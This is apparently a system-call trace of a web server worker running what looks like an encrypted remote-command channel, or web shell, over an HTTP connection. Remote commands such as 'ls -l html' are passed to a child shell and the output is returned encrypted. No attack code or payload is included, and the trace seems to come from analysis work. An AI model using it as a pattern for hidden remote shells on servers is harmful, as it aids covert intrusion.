+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=278756})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "S", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "S\332\345\347M\247\201\27\25%\251\253\3733\353X\350\252\274yS\332\345\346S\332\345oS\332\345\347"..., 8192, MSG_DONTWAIT, NULL, NULL) = 160
+write(13, "ls -l html\n", 11)           = 11
+sendto(11, "\353_$\222\365\"@b\255\240h\336C\266*-P/}\f\353_$\223\353_$\32\353_$\223"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=998558})
+select(15, [14], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=0})
+fcntl(14, F_GETFL)                      = 0 (flags O_RDONLY)
+read(14, "total 196\n-rw-r--r--  1 www-data"..., 8192) = 1372
+sendto(11, "\227^l\302\211#\0102\321\241 \216?\267b},.5\\\227^l\303\227^i*\227^l\302"..., 1536, MSG_DONTWAIT, NULL, 0) = 1536
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=533215})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "2", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "2\323\t',\256m\327t,Ek\232:\7\230\211\243P\2712\323\t&2\323\t_2\323\t'"..., 8192, MSG_DONTWAIT, NULL, NULL) = 144
+write(13, "exit\n", 5)                  = 5
+sendto(11, "\346\230\251\243\370\345\315S\240g\345\357Nq\247\34]\350\360=\346\230\251\242\346\230\251+\346\230\251\242"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=77, si_uid=33, si_status=0, si_utime=0, si_stime=0} ---
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 2 (in [14 16], left {tv_sec=0, tv_usec=999998})
+select(15, [14], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=0})
+fcntl(14, F_GETFL)                      = 0 (flags O_RDONLY)
+read(14, "", 8192)                      = 0
+select(17, [16], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [16], left {tv_sec=0, tv_usec=0})
+fcntl(16, F_GETFL)                      = 0 (flags O_RDONLY)
+read(16, "", 8192)                      = 0
+select(17, [11 14 16], [], [], {tv_sec=1, tv_usec=0}) = 2 (in [14 16], left {tv_sec=0, tv_usec=999998})
+select(15, [14], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [14], left {tv_sec=0, tv_usec=0})
+close(13)                               = 0
+close(14)                               = 0
+close(16)                               = 0
+sendto(11, "\263(s\200\255U\27p\365\327?\314\33\301}?\10X*\36\263(s\201\263(s\370\263(s\200"..., 144, MSG_DONTWAIT, NULL, 0) = 144
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=713272})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "`", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "`\267\342\200~\312\206p&H\256\314\310^\354?\333\307\273\36`\267\342\201`\267\342\330`\267\342\200"..., 8192, MSG_DONTWAIT, NULL, NULL) = 112
+chdir("/var/www/html")                  = 0
+wait4(77, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG, NULL) = 77
+close(11)                               = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=30, tv_usec=0}}, NULL) = 0
+fcntl(8, F_SETLK, {l_type=F_UNLCK, l_whence=SEEK_SET, l_start=0, l_len=0}) = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=0, tv_usec=0}}, NULL) = 0
+read(10, "", 8000)                      = 0
+writev(10, [{iov_base="HTTP/1.1 200 OK\r\nDate: Tue, 20 A"..., iov_len=172}, {iov_base="/*", iov_len=2}], 2) = 174
+write(7, "192.168.0.103 - - [20/Apr/2021:0"..., 158) = 158
+times({tms_utime=55, tms_stime=11, tms_cutime=1, tms_cstime=1}) = 1432012554
+shutdown(10, SHUT_WR)                   = 0
+poll([{fd=10, events=POLLIN}], 1, 2000) = 1 ([{fd=10, revents=POLLIN|POLLHUP}])
+read(10, "", 512)                       = 0
+close(10)                               = 0
+read(4, 0x7ffd088e5d9f, 1)              = -1 EAGAIN (Resource temporarily unavailable)
+accept4(3,  <detached ...>
